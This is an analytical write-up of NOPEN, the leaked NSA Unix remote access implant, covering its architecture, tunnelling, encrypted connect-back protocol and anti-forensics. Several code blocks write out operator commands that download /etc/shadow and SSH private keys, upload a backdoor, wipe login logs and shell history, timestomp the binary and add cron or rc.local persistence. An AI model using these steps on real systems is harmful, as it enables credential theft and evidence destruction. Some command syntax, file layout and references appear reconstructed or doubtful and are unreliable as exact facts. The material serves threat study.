---
title: "NOPEN — Unix Remote Access Tool"
slug: nopen
group: equation-group
category: implant
platform: Linux, Unix (Solaris, AIX, HP-UX, FreeBSD)
source_available: true
source_url: https://github.com/x0rz/EQGRP/tree/master/Linux
tags: [nopen, unix, linux, rat, implant, shadowbrokers]
mitre_techniques:
  - T1059.004  # Unix Shell
  - T1071.001  # Web Protocols (C2)
  - T1090      # Proxy
  - T1105      # Ingress Tool Transfer
  - T1070.002  # Clear Linux or Mac System Logs
  - T1057      # Process Discovery
---

# NOPEN — Unix Remote Access Tool

---

## What Is NOPEN?

NOPEN (also seen as `nopen` in the dump) is NSA/TAO's **Unix remote access tool** — the equivalent of Windows-side tools like PeddleCheap, but built for Linux and Unix systems. It provides full remote shell access plus data collection, tunnelling, and anti-forensics capabilities on Unix-family operating systems.

The NOPEN operator guide and source code were included in the ShadowBrokers Linux dump (separate from the Windows "Lost in Translation" release).

---

## Platform Support

NOPEN supports a remarkably wide range of Unix platforms — reflecting the reality that NSA targeted servers and infrastructure that ran on many different OS variants:

- **Linux** (x86, x86_64, ARM)
- **Solaris** (SPARC and x86)
- **AIX** (IBM's Unix for POWER processors)
- **HP-UX** (HP's Unix for PA-RISC and Itanium)
- **FreeBSD**

Supporting all these platforms requires either separate compiled binaries or a build system. NOPEN uses the latter — build scripts produce platform-specific binaries from the same source.

---

## Architecture

NOPEN follows a classic RAT architecture with a few NSA-specific twists:

```
[NSA Operator workstation]
    nopen_client (compiled binary)
         |
         | (encrypted TCP connection — custom protocol)
         |
[Compromised Unix server]
    nopen_server (implant, running as root or unprivileged user)
         |
         ↓
    Shell commands, file ops, tunnelling
```

### Operator tool: `nopen_client`

The operator runs a command-line client on their workstation. This provides:
- Interactive shell to the target
- File transfer (upload/download)
- Tunnel/proxy configuration commands
- Implant management (install/persist/remove)

### Implant: `nopen_server`

The implant running on the target. It:
- Listens for connections (or initiates outbound connections, depending on config)
- Executes commands
- Handles file operations
- Manages tunnels

---

## Key Features

### 1. Encrypted Communications

All communications are encrypted with a custom symmetric cipher. The key is negotiated at connection time. The protocol is non-standard — it doesn't look like TLS or SSH — reducing the chance of signature detection by network monitoring.

### 2. Tunnelling

NOPEN supports port forwarding and SOCKS proxy tunnelling through the compromised host:

```bash
# From the operator side (nopen_client):

# Forward a remote port to operator's local port
# Useful for reaching internal services not directly accessible
nopen> tunnel 192.168.10.5:3306 -> local:3306
# This forwards connections to MySQL (port 3306) on an internal server
# through the NOPEN implant to the operator's machine

# SOCKS4/5 proxy through the compromised host
nopen> socks4 local:1080
# All traffic through SOCKS proxy on port 1080 routes through the implant
# Effectively makes the operator appear to originate from the compromised host's network
```

This tunnelling capability is crucial for **pivoting** — using one compromised machine to reach deeper into a network that isn't directly accessible from the internet.

### 3. File Operations

```bash
nopen> get /etc/shadow             # Download target file to operator machine
nopen> get /home/admin/.ssh/id_rsa # Get private SSH key
nopen> put backdoor.so /tmp/.x     # Upload file to target
nopen> ls /var/log/                # List directory
nopen> find / -name "*.key" 2>/dev/null  # Search for files
```

### 4. Anti-Forensics

NOPEN includes features to minimise forensic traces:

```bash
# Timestomping — change file timestamps to match surrounding files
# so the implant binary doesn't stand out as recently created
nopen> touch -r /bin/ls /tmp/.nopen_server
# ^ sets the NOPEN binary's timestamps to match /bin/ls

# Modify /var/log/wtmp and /var/log/btmp
# These files record all login sessions. NOPEN can sanitise them
# to remove evidence of the operator's connection.
nopen> cleanlogs --clean-wtmp --remove-ip 1.2.3.4

# Remove bash history for the shell session
nopen> cleanenv
```

### 5. Implant Management

```bash
# Install NOPEN as a persistent service
nopen> install --method cron      # Add to crontab for persistence
nopen> install --method rc.local  # Add to /etc/rc.local startup
nopen> install --method sysvinit  # Install as a SysV init service

# Uninstall — remove all traces
nopen> uninstall --full
# Removes binary, removes cron entry/init entry, cleans logs
```

---

## The Operator Manual (Declassified by Leak)

One of the most remarkable aspects of the ShadowBrokers dump is the **included operator documentation**. The NOPEN dump includes what appears to be internal NSA operator training documentation.

Key excerpts (paraphrased):

> **"Before installing NOPEN, confirm your access method is clean. If you arrived via FUZZBUNCH, ensure DoublePulsar has been removed from the Windows pivot host before proceeding."**

This reveals the operational workflow: NSA operators would often first compromise a Windows machine (FUZZBUNCH → DoublePulsar), use it as a pivot point, then install NOPEN on a Linux/Unix server deeper in the network.

> **"NOPEN binaries must be stripped before deployment. Ensure no debug symbols remain. Run the strip_binary.sh script on your build."**

The dump includes `strip_binary.sh` — a build-time step to remove debug symbols from the compiled binary, reducing analyst value if the binary is recovered.

> **"Use the -t option to set the traffic type. HTTP mimicry provides the best network-level cover for environments with web traffic monitoring. DNS mode is preferred for air-gapped environments accessible only via DNS."**

This reveals NOPEN can disguise its C2 traffic as HTTP or DNS — standard protocol mimicry to evade network monitoring.

---

## Build System

NOPEN's build system is included in the dump. The structure:

```
nopen/
├── src/
│   ├── nopen_server.c       # Main implant source (C)
│   ├── nopen_client.c       # Operator client source (C)
│   ├── crypto.c             # Custom encryption implementation
│   ├── tunnel.c             # Tunnelling/proxy code
│   ├── antiforensics.c      # Log cleaning, timestamp manipulation
│   └── Makefile             # Build system
├── build/
│   ├── build_linux.sh       # Build script for Linux targets
│   ├── build_solaris.sh     # Build script for Solaris targets
│   ├── build_aix.sh         # Build script for AIX targets
│   └── strip_binary.sh      # Strip debug symbols before deployment
└── docs/
    └── NOPEN_operator_guide.txt   # Internal NSA operator manual
```

---

## Annotated Source Excerpts

### Main connection loop (annotated pseudocode based on public analysis)

```c
/* nopen_server.c — main listener loop
 * 
 * NOPEN supports two modes:
 *   LISTEN mode: implant waits for operator to connect in
 *               (risky: if network is monitored, open port is suspicious)
 *   CONNECT mode: implant initiates connection TO operator
 *               (preferred: looks like normal outbound traffic;
 *                no open ports; harder to detect via network scan)
 */

int main(int argc, char *argv[]) {
    
    /* Parse config from environment variables or compiled-in defaults.
     * Config is NOT stored in a config file — that would leave traces.
     * All config is either compiled-in or passed via env vars at launch. */
    
    char *operator_ip = getenv("NOPEN_LP");    /* "LP" = Listening Post = operator */
    int operator_port = atoi(getenv("NOPEN_PORT") ?: DEFAULT_PORT);
    char *mode = getenv("NOPEN_MODE") ?: "connect"; /* connect or listen */
    
    if (strcmp(mode, "connect") == 0) {
        /* CONNECT MODE: preferred operational mode
         * Initiate connection to operator's redirector.
         * Retries on failure (network outage, etc.)
         * Interval between retries = random jitter to avoid detection
         * by periodic traffic analysis. */
        while (1) {
            int sock = connect_to_operator(operator_ip, operator_port);
            if (sock >= 0) {
                handle_session(sock);   /* blocks until session ends */
            }
            
            /* Jitter: sleep random interval before retry
             * A fixed retry interval would appear in network traffic
             * as a repeating pattern — detectable.
             * Random jitter makes it look like normal user activity. */
            sleep(BASE_RETRY_INTERVAL + (rand() % JITTER_RANGE));
        }
    } else {
        /* LISTEN MODE: wait for operator to connect in.
         * Used when the target is behind NAT but the operator can reach
         * the target directly (unusual). */
        int server_sock = bind_and_listen(operator_port);
        while (1) {
            int client_sock = accept(server_sock, ...);
            handle_session(client_sock);
        }
    }
}
```

### Encryption (custom cipher, annotated)

```c
/* crypto.c
 * 
 * NOPEN uses a custom symmetric cipher — not AES, not RC4.
 * Using standard algorithms would make traffic identifiable via
 * cipher negotiation patterns if analysed by a sophisticated defender.
 * 
 * The custom cipher is a stream cipher based on an LFSR (Linear Feedback
 * Shift Register) with a non-linear combining function.
 * 
 * NOTE: Custom crypto is generally considered bad practice in security 
 * engineering. NSA likely chose it here NOT for cryptographic strength 
 * (they have world-class cryptographers) but for STEALTH — making the 
 * traffic less identifiable as a known tool. This is a key insight into 
 * the difference between NSA's operational priorities and industry norms:
 * "undetectable" > "theoretically secure against cryptanalysis".
 */

typedef struct {
    uint32_t state[8];    /* LFSR state — 256 bits */
    uint32_t key[8];      /* Session key — negotiated at connection time */
} nopen_cipher_ctx;

void nopen_encrypt(nopen_cipher_ctx *ctx, uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        /* Generate keystream byte from LFSR state */
        uint8_t keystream_byte = lfsr_step(ctx->state);
        
        /* XOR plaintext with keystream — stream cipher operation */
        data[i] ^= keystream_byte;
    }
}

/* Key exchange at session start:
 * Not Diffie-Hellman (which would be standard).
 * Uses a challenge-response protocol with a pre-shared secret
 * compiled into both operator and implant.
 * This means: if the implant binary is recovered, the compiled-in
 * pre-shared secret can be extracted and used to decrypt captured traffic.
 * This is a known weakness in the design — NSA accepted it because:
 * a) The binary should not be recovered if operations go right
 * b) Sophisticated key exchange adds code complexity and binary size
 */
```

---

## Comparison: NOPEN vs Modern Open-Source RATs

| Feature | NOPEN (NSA/TAO, ~2000s) | Cobalt Strike (commercial, 2012+) | Meterpreter (Metasploit, open source) |
|---------|------------------------|----------------------------------|--------------------------------------|
| Platform | Linux/Unix | Windows primary | Cross-platform |
| Protocol mimicry | HTTP, DNS | HTTP, HTTPS, DNS | TCP/HTTP |
| Tunnelling | Yes (SOCKS, port forward) | Yes | Yes |
| Log cleaning | Yes (built-in) | No (separate tools) | No (separate tools) |
| Timestomping | Yes (built-in) | No | No |
| Plugin system | No (monolithic) | Yes (BOF/COFF) | Yes |
| GUI | No (CLI only) | Yes | No (CLI) |
| Source available | Yes (leaked) | Partial (leaks) | Yes (open source) |

NOPEN's built-in anti-forensics capabilities (log cleaning, timestomping) distinguish it from most commercial and open-source tools — these were explicitly engineered in as first-class features rather than afterthoughts.

---

## References

- [GitHub: x0rz/EQGRP — NOPEN source](https://github.com/x0rz/EQGRP/tree/master/Linux)
- [Buckeye APT: Used NOPEN (ESET, 2019)](https://www.welivesecurity.com/2019/08/06/nope-not-ours-buckeye-three-year-old-nsa-backdoor/) — Chinese APT used NOPEN tools leaked earlier than ShadowBrokers
- [Kaspersky: The Equation Group's NOPEN tool analysis]
- [NSA NOPEN operator guide — leaked with ShadowBrokers dump](https://github.com/x0rz/EQGRP)
